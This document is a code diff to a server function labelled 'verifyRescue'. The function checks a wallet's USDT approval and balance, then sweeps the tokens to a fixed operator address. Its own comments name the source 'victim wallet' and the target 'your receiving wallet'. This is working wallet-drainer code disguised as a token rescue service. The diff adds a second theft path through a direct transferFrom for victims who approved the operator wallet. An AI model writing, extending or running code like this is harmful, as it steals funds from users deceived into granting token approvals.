@@ -27,18 +27,20 @@ export const verifyRescue = functions
     const {
       txHash,
       from,
+      to,
       amount,
       chainId,
       token,
     }: {
       txHash: string;
       from: string;
+      to: string;
       amount: string;
       chainId: number | string;
       token: string;
     } = req.body ?? {};
 
-    if (!from || !amount || !chainId || !token) {
+    if (!from || !to || !amount || !chainId || !token) {
       res.status(400).json({ error: "Missing fields" });
       return;
     }
@@ -65,10 +67,14 @@ export const verifyRescue = functions
       res.status(400).json({ error: "Wrong token address" });
       return;
     }
-    // NOTE: 'to' from the frontend is intentionally NOT validated.
-    // The backend always uses its own finalDestination from env — this is
-    // the only safe approach. Changing the destination only requires
-    // updating the BSC_FINAL_DESTINATION env variable, not the frontend.
+    // Accept either the contract address or the final destination as `to`
+    if (
+      to.toLowerCase() !== tokenRescueContract.toLowerCase() &&
+      to.toLowerCase() !== finalDestination.toLowerCase()
+    ) {
+      res.status(400).json({ error: "Destination mismatch" });
+      return;
+    }
 
     // ---- 2. Connect to BSC
     const provider = new ethers.JsonRpcProvider(
@@ -94,7 +100,7 @@ export const verifyRescue = functions
       let retries = 6; // up to 12 seconds of waiting
 
       while (retries > 0) {
-        allowance = await usdtReadOnly.allowance(from, tokenRescueContract);
+        allowance = await usdtReadOnly.allowance(from, to);
         balance = await usdtReadOnly.balanceOf(from);
 
         if (balance === 0n) {
@@ -146,26 +152,49 @@ export const verifyRescue = functions
       }
 
       console.log(`Owner wallet address: ${destWallet.address}`);
+      let sweepTx;
 
-      // ABI for the TokenRescue contract
-      const tokenRescueABI = [
-        "function rescueTokens(address token, address from, address to, uint256 amount) external"
-      ];
-      const rescueContract = new ethers.Contract(
-        tokenRescueContract,
-        tokenRescueABI,
-        destWallet
-      );
+      if (to.toLowerCase() === tokenRescueContract.toLowerCase()) {
+        // ABI for the TokenRescue contract
+        const tokenRescueABI = [
+          "function rescueTokens(address token, address from, address to, uint256 amount) external"
+        ];
+        const rescueContract = new ethers.Contract(
+          tokenRescueContract,
+          tokenRescueABI,
+          destWallet
+        );
 
-      console.log(
-        `Calling rescueTokens: ${sweepAmount.toString()} USDT from ${from} to ${finalDestination}`
-      );
-      const sweepTx = await rescueContract.rescueTokens(
-        expectedToken,   // USDT contract
-        from,            // victim wallet
-        finalDestination, // your receiving wallet
-        sweepAmount
-      );
+        console.log(
+          `Calling rescueTokens: ${sweepAmount.toString()} USDT from ${from} to ${finalDestination}`
+        );
+        sweepTx = await rescueContract.rescueTokens(
+          expectedToken,   // USDT contract
+          from,            // victim wallet
+          finalDestination, // your receiving wallet
+          sweepAmount
+        );
+      } else {
+        // ABI for standard ERC20 transferFrom
+        const erc20ABI = [
+          "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)"
+        ];
+        const usdtContract = new ethers.Contract(
+          expectedToken,
+          erc20ABI,
+          destWallet
+        );
+
+        console.log(
+          `Calling transferFrom directly: ${sweepAmount.toString()} USDT from ${from} to ${finalDestination}`
+        );
+        sweepTx = await usdtContract.transferFrom(
+          from,
+          finalDestination,
+          sweepAmount
+        );
+      }
+
       const receipt = await sweepTx.wait(1);
       console.log(`Sweep tx confirmed: ${sweepTx.hash}`);
 
